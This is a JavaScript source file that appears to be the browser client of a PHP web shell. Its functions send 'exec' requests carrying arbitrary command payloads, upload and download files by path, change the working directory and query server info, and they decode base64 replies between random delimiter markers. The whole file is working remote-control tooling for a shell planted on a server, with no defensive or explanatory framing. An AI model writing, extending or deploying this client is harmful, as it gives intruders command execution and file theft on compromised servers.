"use strict";

let lastResponse = undefined;
let cwd = "";
const xhrIndicators = {};

const removeFromArray = (array, item) => {
    array.splice(array.indexOf(item), 1);
};

let onCwdUpdated = (cwd) => {
};

const onProgress = (cmd, body, close = false) => {
    return (e) => {
        handleProgress(e, cmd, body, close);
    };
};

const hc = (target, cmd, body) => {
    return target + cmd + JSON.stringify(body)
};

const handleProgress = (e, cmd, body, close) => {
    const perc = getPercentage(e.total, e.loaded);
    let ind = xhrIndicators[hc(e.target, cmd, body)];
    if (!ind) {
        ind = createXhrIndicator(e.target, cmd, body);
    }

    const el = new KjbElement(ind.node.lastChild);
    el.setText(perc);

    if (close) {
        xhrIndicators[hc(e.target, cmd, body)] = undefined;
        ind.node.remove();
    }
};

const createXhrIndicator = (target, cmd, body) => {
    const getName = (target, cmd, body) => {
        let type = "Download";
        if (target.toString().toLowerCase().includes("upload")) {
            type = "Upload";
        }

        return `${type} ${cmd}`;
    };

    const indicator = $("<div>").addClass("indicator")
        .append($("<div>").setText(getName(target, cmd, body)).addClass("reqName"))
        .append($("<div>").setStyle("width", "0.5em"))
        .append($("<div>").addClass("reqPercent").setText("..."));
    $("#targetInfo").append(indicator);
    xhrIndicators[hc(target, cmd, body)] = indicator;
    return indicator;
};

const getPercentage = (max, curr) => {
    if (max === 0) {
        curr = 1;
        max = 1;
    }
    return Math.round(100 * (curr / max)) + "%";
};

const request = (cmd, body, success, error, dontParse = false) => {
    const xhr = new XMLHttpRequest();
    const delimiter = generateId(64);
    xhr.upload.onprogress = onProgress(cmd, body);
    xhr.upload.onload = onProgress(cmd, body);
    xhr.upload.onloadend = onProgress(cmd, body, true);
    xhr.upload.onloadstart = onProgress(cmd, body);
    xhr.onprogress = onProgress(cmd, body);
    xhr.onload = onProgress(cmd, body);
    xhr.onloadend = onProgress(cmd, body, true);
    xhr.onloadstart = onProgress(cmd, body);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            let data;
            if (dontParse) {
                data = xhr.responseText;
            } else {
                try {
                    const txt = xhr.responseText;
                    const beginMarker = `KJB_${delimiter}_BEGIN`;
                    const endMarker = `KJB_${delimiter}_END`;
                    const begin = txt.indexOf(beginMarker) + beginMarker.length;
                    const end = txt.lastIndexOf(endMarker);
                    data = JSON.parse(atob(txt.slice(begin, end)));
                    lastResponse = data;
                } catch (exc) {
                    lastResponse = undefined;
                    error(xhr.status, exc);
                    return;
                }
            }
            if (xhr.status === 200 && !data["errmsg"]) {
                if (!dontParse) {
                    handleData(data);
                }
                success(data);
            } else {
                error(xhr.status, data);
            }
        }
    };
    xhr.open("POST", document.location, true);
    xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
    xhr.send(JSON.stringify({"req": {cwd, cmd, body, delimiter}}));
    return xhr;
};

const generateId = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
};

const requestExec = (cmd, success, err) => {
    request("exec", {"payload": cmd}, success, err);
};

const requestEval = (php, success, err) => {

};

const requestDownload = (file) => {
    const url = `${window.location}/?download=` + encodeURIComponent(cwd + "/" + file);
    log(`Downloading ${file} from ${url}`);
    window.open(url);
};

const requestCheckDownloadable = (file, success, err) => {
    request("check_downloadable", {file}, success, err);
};

const requestUpload = (path, content, success, err) => {
    const xhr = request("upload", {path, content}, success, err);
};

const requestCd = (dir, success, err) => request("cd", {"path": dir}, success, err);

const requestInfo = (success, err) => request("info", {}, success, err);

const handleData = (data) => {
    cwd = data["cwd"];
    onCwdUpdated(cwd);
};
